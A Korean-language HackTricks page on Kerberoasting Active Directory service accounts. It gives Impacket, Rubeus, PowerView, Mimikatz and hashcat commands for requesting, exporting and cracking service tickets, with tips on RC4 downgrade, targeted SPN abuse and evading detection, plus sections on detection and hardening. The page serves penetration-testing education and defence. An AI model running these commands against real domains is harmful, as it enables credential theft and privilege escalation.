# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting은 TGS 티켓의 획득에 초점을 맞추며, 특히 컴퓨터 계정을 제외하고 Active Directory (AD)에서 사용자 계정으로 실행되는 서비스와 관련된 티켓을 대상으로 합니다. 이러한 티켓의 암호화에는 사용자 비밀번호에서 파생된 키가 사용되므로, 오프라인에서 자격 증명을 크래킹할 수 있습니다. 서비스를 사용자 계정으로 사용하고 있다는 것은 비어 있지 않은 ServicePrincipalName (SPN) 속성으로 확인할 수 있습니다.

인증된 모든 도메인 사용자는 TGS 티켓을 요청할 수 있으므로 특별한 권한이 필요하지 않습니다.<sup>[[4]](#references)[[5]](#references)</sup>

### 핵심 사항

- 사용자 계정으로 실행되는 서비스, 즉 SPN이 설정된 계정의 TGS 티켓을 대상으로 합니다. 컴퓨터 계정은 대상이 아닙니다.
- 티켓은 서비스 계정의 비밀번호에서 파생된 키로 암호화되며, 오프라인에서 크랙할 수 있습니다.
- 높은 권한이 필요하지 않으며, 인증된 모든 계정이 TGS 티켓을 요청할 수 있습니다.

> [!WARNING]
> 대부분의 공개 도구는 AES보다 크랙 속도가 빠른 RC4-HMAC (etype 23) 서비스 티켓을 요청하는 것을 선호합니다. RC4 TGS 해시는 `$krb5tgs$23$*`로 시작하고, AES128은 `$krb5tgs$17$*`, AES256은 `$krb5tgs$18$*`로 시작합니다. 그러나 많은 환경이 AES-only로 전환하고 있습니다. RC4만 관련 있다고 가정하지 마세요.
> 또한 “spray-and-pray” roasting은 피하세요. Rubeus의 기본 kerberoast는 모든 SPN을 조회하고 티켓을 요청할 수 있어 탐지 노이즈가 큽니다. 먼저 흥미로운 principal을 열거하고 대상으로 지정하세요.

### 서비스 계정 시크릿 및 Kerberos 암호화 비용

많은 서비스가 여전히 수동으로 관리되는 비밀번호를 사용하는 사용자 계정으로 실행됩니다. KDC는 해당 비밀번호에서 파생된 키로 서비스 티켓을 암호화한 뒤, 인증된 모든 principal에게 암호문을 전달하므로 kerberoasting은 계정 잠금이나 DC telemetry 없이 무제한 오프라인 추측을 가능하게 합니다. 암호화 모드에 따라 크래킹에 사용할 수 있는 예산이 결정됩니다:

| 모드 | 키 파생 | 암호화 유형 | 대략적인 RTX 5090 처리량* | 비고 |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | 도메인 + SPN에서 생성된 principal별 salt와 4,096회 반복을 사용하는 PBKDF2-HMAC-SHA1 | etype 17/18 (`$krb5tgs$17$`, `$krb5tgs$18$`) | 초당 약 680만 회 추측 | Salt가 rainbow table을 무력화하지만 짧은 비밀번호는 여전히 빠르게 크래킹할 수 있습니다. |
| RC4 + NT hash | 비밀번호에 대한 단일 MD4 (salt가 없는 NT hash); Kerberos는 티켓마다 8바이트 confounder만 혼합 | etype 23 (`$krb5tgs$23$`) | 초당 약 **41.8억** 회 추측 | AES보다 약 1000배 빠르며, `msDS-SupportedEncryptionTypes`가 허용하는 경우 공격자는 RC4를 강제합니다. |

*[Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)에서 인용된 Chick3nman의 벤치마크입니다.<sup>[[3]](#references)</sup>

RC4의 confounder는 keystream만 무작위화하며, 추측마다 필요한 작업량을 늘리지는 않습니다. 서비스 계정이 무작위 시크릿(gMSA/dMSA, 머신 계정 또는 vault에서 관리되는 문자열)에 의존하지 않는 한, 침해 속도는 순전히 GPU 예산에 의해 결정됩니다. AES-only etype을 적용하면 초당 수십억 회 추측이 가능한 downgrade를 제거할 수 있지만, 취약한 사람의 비밀번호는 여전히 PBKDF2에 의해 크래킹됩니다.<sup>[[3]](#references)</sup>

### 공격

#### Linux

NetExec을 사용해 roastable 티켓을 요청하고 Hashcat으로 크랙하는 실용적인 end-to-end 예시는 reference [1]에서 확인할 수 있습니다.<sup>[[1]](#references)</sup>
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast 검사를 포함한 다기능 도구:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- kerberoastable 사용자 열거
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS 요청 후 메모리에서 dump
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Technique 2: 자동화 도구
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS 요청은 Windows Security Event 4769 (Kerberos service ticket was requested)를 생성합니다.

### OPSEC 및 AES-only 환경

- AES가 없는 계정에 의도적으로 RC4 요청:
- Rubeus: `/rc4opsec`는 tgtdeleg를 사용하여 AES가 없는 계정을 열거하고 RC4 service ticket을 요청합니다.
- Rubeus: kerberoast와 함께 `/tgtdeleg`를 사용하면 가능한 경우 RC4 요청도 발생합니다.<sup>[[6]](#references)</sup>
- 조용히 실패하는 대신 AES-only 계정을 Roast:
- Rubeus: `/aes`는 AES가 활성화된 계정을 열거하고 AES service ticket (etype 17/18)을 요청합니다.
- 이미 TGT(PTT 또는 .kirbi에서 가져온 것)를 보유하고 있다면 `/spn:<SPN>` 또는 `/spns:<file>`과 함께 `/ticket:<blob|path>`를 사용하여 LDAP를 건너뛸 수 있습니다.
- Targeting, throttling 및 noise 감소:
- `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` 및 `/jitter:<1-100>`을 사용합니다.
- `/pwdsetbefore:<MM-dd-yyyy>`(오래된 password)를 사용하여 취약할 가능성이 높은 password를 필터링하거나 `/ou:<DN>`으로 권한이 높은 OU를 대상으로 지정합니다.<sup>[[8]](#references)</sup>

예시 (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

계정을 제어하거나 수정할 수 있다면, SPN을 추가하여 해당 계정을 kerberoastable 상태로 만들 수 있습니다:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
더 쉽게 cracking할 수 있도록 RC4를 활성화하게 계정을 downgrade합니다 (대상 객체에 대한 write privileges 필요):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### GenericWrite/GenericAll을 통한 사용자 대상 Targeted Kerberoast (임시 SPN)

BloodHound에서 사용자 객체에 대한 제어 권한(예: GenericWrite/GenericAll)이 있음을 보여 주는 경우, 해당 사용자에게 현재 SPN이 없더라도 안정적으로 특정 사용자를 “targeted-roast”할 수 있습니다:<sup>[[9]](#references)</sup>

- 제어 중인 사용자에게 임시 SPN을 추가하여 roastable 상태로 만듭니다.
- 해당 SPN에 대해 RC4(etype 23)로 암호화된 TGS-REP를 요청하여 cracking에 유리하게 합니다.
- `$krb5tgs$23$...` hash를 hashcat으로 crack합니다.
- footprint를 줄이기 위해 SPN을 정리합니다.

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner (targetedKerberoast.py는 SPN 추가 -> TGS 요청 (etype 23) -> SPN 제거를 자동화):<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
hashcat autodetect를 사용하여 output을 crack합니다 (`$krb5tgs$23$`의 경우 mode 13100):
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
탐지 참고 사항: SPN을 추가하거나 제거하면 디렉터리 변경이 발생하며(대상 사용자에서 Event ID 5136/4738), TGS 요청은 Event ID 4769를 생성합니다. 요청 속도 제한과 prompt cleanup을 고려하세요.

Kerberoast 공격에 유용한 도구는 여기에서 확인할 수 있습니다: https://github.com/nidem/kerberoast

Linux에서 다음 오류가 발생한다면: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` 로컬 시간 오프셋 때문입니다. DC와 시간을 동기화하세요:

- `ntpdate <DC_IP>` (일부 배포판에서는 deprecated)
- `rdate -n <DC_IP>`

### 도메인 계정 없이 Kerberoast 수행 (AS-requested STs)

2022년 9월, Charlie Clark는 principal에 pre-authentication이 필요하지 않은 경우 요청 본문의 sname을 변경한 조작된 KRB_AS_REQ를 통해 service ticket을 얻을 수 있음을 공개했습니다. 즉, TGT 대신 service ticket을 효과적으로 획득하는 것입니다. 이는 AS-REP roasting과 유사하며 유효한 도메인 자격 증명이 필요하지 않습니다.

자세한 내용은 Semperis의 write-up “New Attack Paths: AS-requested STs”를 참조하세요.<sup>[[10]](#references)</sup>

> [!WARNING]
> 유효한 자격 증명이 없으면 이 technique으로 LDAP를 쿼리할 수 없으므로 사용자 목록을 제공해야 합니다.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
관련

AS-REP roastable users를 대상으로 하는 경우 다음도 참조하세요:

{{#ref}}
asreproast.md
{{#endref}}

### 탐지

Kerberoasting은 은밀하게 수행될 수 있습니다. DC에서 Event ID 4769를 검색하고 다음 필터를 적용하여 노이즈를 줄이세요:

- 서비스 이름 `krbtgt` 및 `$`로 끝나는 서비스 이름(컴퓨터 계정)을 제외합니다.
- 컴퓨터 계정에서의 요청(`*$$@*`)을 제외합니다.
- 성공한 요청만 확인합니다(Failure Code `0x0`).
- 암호화 유형을 추적합니다: RC4(`0x17`), AES128(`0x11`), AES256(`0x12`). `0x17`만을 기준으로 alert하지 마세요.

PowerShell triage 예시:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
추가 아이디어:

- 호스트/사용자별 일반적인 SPN 사용량을 baseline으로 설정하고, 단일 principal에서 발생하는 서로 다른 SPN 요청의 대량 burst를 alert합니다.
- AES로 hardening된 도메인에서 비정상적인 RC4 사용을 flag합니다.

### Mitigation / Hardening

- 서비스에는 gMSA/dMSA 또는 machine account를 사용합니다. Managed account는 120자 이상의 random password를 사용하고 자동으로 rotate되므로 offline cracking이 현실적으로 어렵습니다.<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes`를 AES-only(십진수 24 / 16진수 0x18)로 설정하여 service account에 AES를 enforce한 다음, password를 rotate하여 AES key가 derive되도록 합니다.<sup>[[7]](#references)</sup>
- 가능한 경우 환경에서 RC4를 disable하고 RC4 사용 시도를 monitor합니다. DC에서는 `msDS-SupportedEncryptionTypes`가 설정되지 않은 account의 default를 조정하기 위해 `DefaultDomainSupportedEncTypes` registry value를 사용할 수 있습니다. 충분히 test해야 합니다.
- user account에서 불필요한 SPN을 제거합니다.<sup>[[7]](#references)</sup>
- Managed account를 사용하기 어려운 경우 길고 random한 service account password(25자 이상)를 사용하고, 일반적인 password를 ban하며 정기적으로 audit합니다.<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach - NetExec LDAP kerberoast + hashcat cracking 실전](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green - Kerberoasting: Legacy Kerberos Crypto를 이용한 Low-Tech, High-Impact Attack (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): Kerberos를 attack하는 방법?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team - Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team - Kerberoasting: AES가 Enabled된 경우 RC4 Encrypted TGS 요청하기](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) - Kerberoasting 완화를 지원하기 위한 Microsoft의 guidance](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps - Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate - SYSVOL creds -> Targeted Kerberoast -> Unconstrained Delegation -> DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis - New Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)
{{#include ../../banners/hacktricks-training.md}}
